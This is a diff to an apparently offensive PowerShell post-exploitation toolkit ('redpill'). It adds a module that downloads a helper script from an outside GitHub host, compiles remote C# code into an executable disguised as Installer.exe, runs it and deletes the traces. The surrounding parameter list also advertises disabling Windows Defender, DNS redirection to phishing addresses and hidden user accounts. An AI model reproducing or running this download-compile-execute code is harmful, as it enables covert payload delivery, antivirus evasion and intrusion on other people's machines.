@@ -83,10 +83,13 @@
    [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
    [string]$UserName="false", [string]$Password="false",
+   [string]$Action="false", [string]$CsOnTheFly="false",
    [string]$MetaData="false", [int]$ButtonType='0',
    [int]$SPort='8080', [string]$PEHollow="false",
    [int]$Limmit='5', [string]$AppLocker="false",
    [string]$Dicionary="$Env:TMP\passwords.txt",
+   [string]$Uri="$env:TMP\SpawnPowershell.cs",
+   [string]$OutFile="$Env:TMP\Installer.exe",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$HiddenUser="false",
@@ -94,8 +97,7 @@
    [string]$EnableRDP="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
-   [string]$Sponsor="false",
-   [string]$Action="false"
+   [string]$Sponsor="false"
 )
 
 
@@ -177,6 +179,7 @@ $ListParameters = @"
   -DnsSpoof         Enum|Redirect|Clear  Redirect Domain Names to our Phishing IP address
   -DisableAV        Query|Start|Stop     Disable Windows Defender Service (WinDefend)
   -HiddenUser       Query|Create|Delete  Query \ Create \ Delete Hidden User Accounts
+  -CsOnTheFly       https://../script.cs Download\Compile (to exe) and exec CS scripts
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -2355,6 +2358,83 @@ If($HiddenUser -ne "false"){
 }
 
 
+If($CsOnTheFly -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Download\Compile\Execute CS scripts On-The-Fly!
+
+   .DESCRIPTION
+      This CmdLet downloads\compiles script.cs (To exe) and executes the binary.
+
+   .NOTES
+      Required dependencies: BitsTransfer {native}
+      This CmdLet allows users to Download script.cs from user input -URI [ URL ]
+      into -OutFile [ absoluct\path\filename.exe ] directory OR simple to compile
+      an Local script.cs into a standalone executable before execute him.
+
+   .Parameter CsOnTheFly
+      Accepts arguments: Compile, Execute (default: Execute)
+
+   .Parameter Uri
+      Script.cs URL to be downloaded OR Local script.cs absoluct \ relative path
+
+   .Parameter OutFile
+      Standalone executable name plus is absoluct \ relative path
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute
+      Create demo script.cs \ compile it to binary.exe and execute him!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Compile -Uri "calc.cs" -OutFile "out.exe"
+      Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -Uri "calc.cs" -OutFile "out.exe"
+      Compiles Local -Uri [ calc.cs ] into an standalone executable and execute it.
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -CsOnTheFly Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
+      Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
+      Remark: Downloading script.CS from network (https://) will mandatory download it to %tmp% directory!
+
+   .OUTPUTS
+      Compiling SpawnPowershell.cs On-The-Fly!
+      ----------------------------------------
+      Microsoft.NET : 4.8.03752
+      NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+      Uri           : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
+      OutFile       : C:\Users\pedro\AppData\Local\Temp\Installer.exe
+      ApplIcon?     : False
+      Compiled?     : True
+
+      Directory                         Name          CreationTime       
+      ---------                         ----          ------------       
+      C:\Users\pedro\AppData\Local\Temp Installer.exe 06/04/2021 15:55:40
+   #>
+
+
+   ## Download CsOnTheFly.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1")){## Download CsOnTheFly.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1 -Destination $Env:TMP\CsOnTheFly.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\CsOnTheFly.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 12){## Corrupted download detected => DefaultFileSize: 12,7041015625/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1"){Remove-Item -Path "$Env:TMP\CsOnTheFly.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   powershell -File "$Env:TMP\CsOnTheFly.ps1" -Action $CsOnTheFly -Uri "$Uri" -OutFile "$OutFile"   
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1"){Remove-Item -Path "$Env:TMP\CsOnTheFly.ps1" -Force}
+}
+
 
 
 
@@ -3767,6 +3847,66 @@ $HelpParameters = @"
       False   DefaultAccount                                                        False
        True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
       False   WDAGUtilityAccount                     01/03/2021 18:58:42             True
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "CsOnTheFly"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Download\Compile\Execute CS scripts On-The-Fly!
+
+   .DESCRIPTION
+      This CmdLet downloads\compiles script.cs (To exe) and executes the binary.
+
+   .NOTES
+      Required dependencies: BitsTransfer {native}
+      This CmdLet allows users to Download script.cs from user input -URI [ URL ]
+      into -OutFile [ absoluct\path\filename.exe ] directory OR simple to compile
+      an Local script.cs into a standalone executable before execute him.
+
+   .Parameter CsOnTheFly
+      Accepts arguments: Compile, Execute (default: Execute)
+
+   .Parameter Uri
+      Script.cs URL to be downloaded OR Local script.cs absoluct \ relative path
+
+   .Parameter OutFile
+      Standalone executable name plus is absoluct \ relative path
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute
+      Create demo script.cs \ compile it to binary.exe and execute him!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Compile -Uri "calc.cs" -OutFile "out.exe"
+      Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -Uri "calc.cs" -OutFile "out.exe"
+      Compiles Local -Uri [ calc.cs ] into an standalone executable and execute it.
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -CsOnTheFly Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "`$Env:TMP\out.exe"
+      Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
+      Remark: Downloading script.CS from network (https://) will mandatory download it to %tmp% directory!
+
+   .OUTPUTS
+      Compiling SpawnPowershell.cs On-The-Fly!
+      ----------------------------------------
+      Microsoft.NET : 4.8.03752
+      NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+      Uri           : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
+      OutFile       : C:\Users\pedro\AppData\Local\Temp\Installer.exe
+      ApplIcon?     : False
+      Compiled?     : True
+
+      Directory                         Name          CreationTime       
+      ---------                         ----          ------------       
+      C:\Users\pedro\AppData\Local\Temp Installer.exe 06/04/2021 15:55:40
    #>!bye..
 
 "@;
